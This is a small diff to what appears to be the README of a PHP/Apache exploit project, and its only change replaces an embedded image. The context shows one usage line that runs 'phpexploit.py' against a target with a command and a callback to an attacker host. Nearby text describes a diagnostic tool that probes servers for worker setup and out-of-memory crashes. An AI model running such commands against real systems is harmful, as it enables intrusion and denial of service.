@@ -242,8 +242,7 @@ python3 phpexploit.py http://target.example.com/ "id" --callback http://attacker
 
 ## Remote diagnostic (diag_remote.py)
 
-<img width="841" height="749" alt="image" src="https://github.com/user-attachments/assets/28a3471e-4cd2-4737-8659-e516d931b9ea" />
-
+<img width="1280" height="640" alt="diag_github_social" src="https://github.com/user-attachments/assets/d00341c8-35b0-4f39-8736-3c1a26a503e9" />
 
 A target-agnostic diagnostic tool for probing remote servers **without needing shell access or error logs**. It answers the questions that the Apache error log would normally answer: is this prefork? how many workers? does A1 trigger OOM? does the worker survive?
 
